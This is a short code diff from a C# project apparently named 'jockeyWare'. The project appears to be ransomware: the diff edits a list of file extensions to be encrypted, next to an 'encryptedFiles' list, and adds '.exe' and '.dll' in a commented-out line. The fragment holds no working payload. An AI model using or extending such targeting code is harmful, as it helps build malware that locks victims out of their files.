@@ -27,7 +27,8 @@ namespace jockeyWare
 			".zip",  ".rar",
 			".alz",  ".egg",
 			".7z",   ".raw",
-			".csv",  ".wma"
+			".csv",  ".wma"/*,
+			".exe",  ".dll" */ // for shits and giggles
 		};
 
 		internal static List<string> encryptedFiles = new List<string>();
